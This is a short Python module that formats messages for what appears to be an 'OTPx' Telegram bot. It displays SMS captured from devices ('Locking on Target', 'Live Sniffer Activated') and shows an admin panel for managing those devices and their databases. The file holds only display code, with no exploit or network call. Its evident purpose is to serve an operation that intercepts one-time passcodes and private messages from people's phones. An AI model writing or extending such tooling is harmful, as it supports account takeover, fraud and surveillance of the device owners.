import os
import re

def is_admin(user_id):
    """Check if user is admin"""
    admin_ids = os.getenv('ADMIN_IDS', '').split(',')
    return str(user_id) in admin_ids

def format_sms_display(device_data, device_id, db_name):
    """Format SMS display with copyable number"""
    sim = str(device_data.get('sim', 'N/A'))
    model = device_data.get('model', 'Unknown')
    from_id = device_data.get('from', 'Unknown')
    time = device_data.get('time', 'Unknown')
    message = device_data.get('message', 'No message available')
    
    display = f"""
🔴 *Locking on Target... Fetching details.*
{time}

*📩 CURRENT LATEST SMS*

• *From:* `{from_id}`
  *Model:* {model}
  *SIM:* `{sim}` | SIM -1
  *Time:* {time}

*📝 Message:*
{message}

*🆔 ID:* `{device_id}`
*📡 Database:* `{db_name}`

{time}

*📡 Live Sniffer Activated for {model}*
Stay tuned! 🎉
"""
    return display

def format_admin_panel(stats, active_db, all_dbs):
    """Admin panel status display"""
    db_list = "\n".join([f"• `{db}` {'✅' if db == active_db else ''}" for db in all_dbs])
    
    return f"""
🔐 *Admin Panel - OTPx Bot*

📊 *Device Statistics:*
• Total Devices: {stats['total']}
• 🟢 Online: {stats['online']}
• 🔴 Offline: {stats['offline']}

🗄️ *Active Database:* `{active_db}`

📋 *Available Databases:*
{db_list}

📋 *Commands:*
/admin - Show this panel
/databases - List all databases
/switch <name> - Switch active database
/add <id|model|from|time|message> - Add device
/list - Show all devices
/online - Show online devices
/offline - Show offline devices
/status <id> - Check device status
/delete <id> - Remove device
"""
